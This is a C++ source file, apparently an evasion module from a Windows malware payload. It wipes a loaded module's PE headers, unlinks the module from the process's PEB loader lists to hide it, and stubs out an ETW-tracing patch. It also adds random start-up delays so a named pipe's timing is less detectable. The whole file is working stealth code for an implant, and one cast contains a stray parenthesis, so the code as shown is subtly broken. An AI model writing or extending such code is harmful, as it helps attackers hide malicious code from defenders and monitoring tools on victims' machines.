// src/payload/evasion.cpp
// C++20 | Windows 11 | MSVC
#include "evasion.hpp"
#include <winternl.h>

namespace rex::evasion {

void wipe_headers(HMODULE base) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt  = (PIMAGE_NT_HEADERS))((BYTE*)base + dos->e_lfanew);
    DWORD old = 0;
    SIZE_T size = nt->OptionalHeader.SizeOfHeaders;
    if (VirtualProtect(base, size, PAGE_READWRITE, &old)) {
        SecureZeroMemory(base, size);
        VirtualProtect(base, size, old, &old);
    }
}

// Full PEB unlink (InLoadOrder, InMemoryOrder, InInitializationOrder)
void unlink_module(HMODULE base) {
#ifdef _WIN64
    auto peb = (PPEB)__readgsqword(0x60);
#else
    auto peb = (PPEB)__readfsdword(0x30);
#endif
    if (!peb || !peb->Ldr) return;

    auto ldr = peb->Ldr;

    auto unlink = [](LIST_ENTRY* entry) {
        entry->Blink->Flink = entry->Flink;
        entry->Flink->Blink = entry->Blink;
        entry->Flink = entry;
        entry->Blink = entry;
    };

    // Walk InLoadOrderModuleList
    for (auto entry = ldr->InLoadOrderModuleList.Flink;
         entry != &ldr->InLoadOrderModuleList;
         entry = entry->Flink)
    {
        auto mod = CONTAINING_RECORD(entry, LDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
        if (mod->DllBase == base) {
            unlink(&mod->InLoadOrderLinks);
            unlink(&mod->InMemoryOrderLinks);
            unlink(&mod->InInitializationOrderLinks);
            break;
        }
    }
}

void disable_etw() {
    // Optional: patch EtwEventWrite / NtTraceEvent – left empty for now
}

void delayed_init(void (*fn)()) {
    // Small jitter so the pipe does not appear at a fixed time
    Sleep(300 + (GetTickCount() % 900));
    fn();
}

} // namespace rex::evasion
